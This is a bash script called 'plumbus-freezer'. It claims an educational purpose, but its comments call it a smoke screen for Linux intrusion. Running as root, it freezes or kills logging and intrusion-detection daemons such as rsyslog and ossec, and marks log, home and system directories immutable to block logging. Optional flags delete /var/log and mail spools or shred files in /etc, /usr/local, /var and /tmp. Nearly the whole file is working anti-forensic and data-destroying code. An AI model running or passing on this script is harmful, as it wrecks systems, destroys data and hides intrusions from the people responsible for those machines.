#!/usr/bin/env bash

# plumbus-freezer requires the GNU Debugger "gdb"

# nasty demo script here for running a muck - for educational purposes.

# It should be executed as root in most instances to demostrate the damage potential of root.
# And also, be careful people, this can shreck a system up. That is the point.

# The plubmus-freezer is made to stop logging and programs in their tracks for 9 minutes, then give them the resume,
# if they can recover! If you activate the commented out freeze3 function, the entire system may crash in some cases.
# And the system might crash anyway, depending on how it is engineered. The plumbus-freezer prevents standard logging
# with the use of the immutable bit. To remove the immutable bit:

# chattr -i $thing

# Recursively:

# chattr -R -i $directory

# If you pass the -darkplumbus flag, the program deletes the log and mail files as well and doesn't resume.
# If you pass the -redplumbus flag, the program shreds system configuration files right before the resume.

# Warning: This is not something you want for your system. This is like a smoke screen for Linux intrusion template.

freeze1 () {
  pgrep -x rsyslog | xargs gdb -p || pkill -9 rsyslog 2>/dev/null
  pgrep -x sec | xargs gdb -p || pkill -9 sec 2>/dev/null
  pgrep -x ossec | xargs gdb -p || pkill -9 ossec 2>/dev/null
}

freeze2 () {
  pgrep -x syslog | xargs gdb -p || pkill -9 syslog 2>/dev/null
}

freeze3 () {
for x in $(pgrep . | grep -v $$); do

  # Uncomment any of these that you really want to hit hard.
  # Many situations this freeze3 function crashes a system!

  # For this reason this function is commented out in the main below
  # and needs to be manually brought in to be used.

  #pgrep -x ufw | xargs gdb -p || pkill -9 ufw 2>/dev/null
  #pgrep -x firewalld | xargs gdb -p || pkill -9 firewalld 2>/dev/null
  #pgrep -x sendmail | xargs gdb -p || pkill -9 sendmail 2>/dev/null
  #pgrep -x postfix | xargs gdb -p || pkill -9 postfix 2>/dev/null
  #pgrep -x java | xargs gdb -p || pkill -9 java 2>/dev/null
  #pgrep -x python | xargs gdb -p || pkill -9 python 2>/dev/null
  #pgrep -x python3 | xargs gdb -p || pkill -9 python3 2>/dev/null
  #pgrep -x ruby | xargs gdb -p || pkill -9 ruby 2>/dev/null

  # freeze up everything but plumbus-freezer pid

  gdb -p $x 2>/dev/null &
  done

}

freeze4 () {
  chattr -R +i /var/log /home /root 2>/dev/null
}

freeze5 () {
  chattr -R +i /opt /var /tmp 2>/dev/null
}

unfreeze () {
  pkill -9 gdb
}

cleanout () {
  rm -rf /var/log/
  rm -rf /var/spool/mail/*
}

main () {
case "$1" in
  -redplumbus)
    freeze1 &&
    freeze2 &
#    freeze3 &
    freeze4 &
    freeze5 &
    sleep 540 &&
    shred /etc/* &
    shred /etc/*/* &
    shred /etc/*/*/* &
    shred /usr/local/*/* &
    shred /var/*/*/* &
    shred /tmp/* &
    unfreeze
;;
  -darkplumbus)
    freeze1 &
    cleanout &
    freeze2 &
#    freeze3 &
    freeze4 &
    freeze5 &
;;
*)
  freeze1 &&
  freeze2 &
#  freeze3 &
  freeze4 &
  freeze5 &
  sleep 540 && unfreeze

esac
}

checkplumbus () {
  s="$(which gdb)"
  if [ -z $s ]; then
    echo "No plumbus: gdb not installed? It is required for your plumbis freezer to have gdb!"
  else
    main "$1" 2>/dev/null &
  fi
  echo -e "\e[34m OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0----------*\e[0m Freeze run complete."
}

checkplumbus
